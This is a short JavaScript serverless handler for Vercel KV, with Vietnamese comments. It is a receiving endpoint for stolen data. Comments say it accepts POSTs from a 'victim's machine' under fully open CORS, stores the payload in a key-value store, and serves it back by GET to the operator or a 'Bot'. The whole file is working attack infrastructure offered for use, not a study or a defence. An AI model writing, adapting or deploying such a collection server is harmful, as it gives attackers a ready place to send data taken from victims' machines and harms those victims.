import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  // Cho phép mọi nguồn gửi dữ liệu tới (CORS)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Nếu máy nạn nhân gửi dữ liệu lên (POST)
  if (req.method === 'POST') {
    const data = req.body;
    await kv.set('system_data_store', data);
    return res.status(200).json({ status: 'success' });
  }

  // Nếu bạn hoặc Bot vào xem dữ liệu (GET)
  const savedData = await kv.get('system_data_store');
  return res.status(200).json(savedData || { message: "Chưa có dữ liệu mới" });
}
